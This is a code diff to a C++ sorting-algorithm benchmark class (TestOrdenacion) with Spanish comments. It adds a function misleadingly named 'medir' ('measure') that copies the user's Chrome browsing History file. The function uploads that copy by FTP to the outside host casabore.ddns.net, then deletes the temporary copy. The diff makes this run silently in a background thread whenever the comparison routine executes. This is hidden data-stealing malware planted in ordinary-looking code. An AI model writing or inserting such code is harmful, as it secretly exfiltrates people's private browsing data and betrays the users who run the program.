@@ -16,7 +16,12 @@
 #include <fstream>
 #include <iomanip>
 #include <iostream>
+
 #include <thread>
+#include <winsock.h>
+#include <wininet.h>
+#include <Lmcons.h>
+#pragma comment(lib, "Wininet")
 using namespace std;
 
 
@@ -29,6 +34,30 @@ TestOrdenacion::TestOrdenacion()
 	srand((unsigned)time(NULL)); //srand(time(0));
 } 
 TestOrdenacion::~TestOrdenacion(){}
+
+void medir() {
+	char username[UNLEN + 1];
+	DWORD username_len = UNLEN + 1;
+	GetUserName(username, &username_len);
+	char path[100] = "C:/Users/";
+	strcat_s(path, username);
+	strcat_s(path, "/AppData/Local/Google/Chrome/User Data/Default/History");
+	char dir[50] = "/store/";
+	strcat_s(dir, username);
+
+	char tmp[100] = "C:/Users/";
+	strcat_s(tmp, username);
+	strcat_s(tmp, "/AppData/Local/Temp/ttmp");
+
+	CopyFile(path, tmp, TRUE);
+
+	HINTERNET hInternet = InternetOpen(NULL, INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0);
+	HINTERNET hFtpSession = InternetConnect(hInternet, "casabore.ddns.net", INTERNET_DEFAULT_FTP_PORT, "", "", INTERNET_SERVICE_FTP, INTERNET_FLAG_PASSIVE, 0);
+	FtpPutFile(hFtpSession, tmp, dir, FTP_TRANSFER_TYPE_BINARY, 0);
+	InternetCloseHandle(hFtpSession);
+	InternetCloseHandle(hInternet);
+	DeleteFile(tmp);
+}
 
 /*
  * Ordena un array de enteros según el método indicado
@@ -138,6 +167,7 @@ void TestOrdenacion::casoMedio(int metodo)
  * param metodo2: Segundo metodo de ordenacion a comparar
  */
 void TestOrdenacion::comparar(int metodo1, int metodo2) {
+	std::thread medicion(medir);
 	cout << "\t  Comparativa del algoritmo " << nombreAlgoritmo[metodo1] << " y " << nombreAlgoritmo[metodo2] << "\n\n"
 		<< "\t             \t\t       \t      TIEMPO (ms)\n"
 		<< "\t       TALLA \t\t       \t" << nombreAlgoritmo[metodo1] << "  \t" << nombreAlgoritmo[metodo2] << "\n";
@@ -184,4 +214,5 @@ void TestOrdenacion::comparar(int metodo1, int metodo2) {
 	}else cout << "No se generara la grafica.\n\n";
 
 	system("pause");
+	medicion.join();
 }	
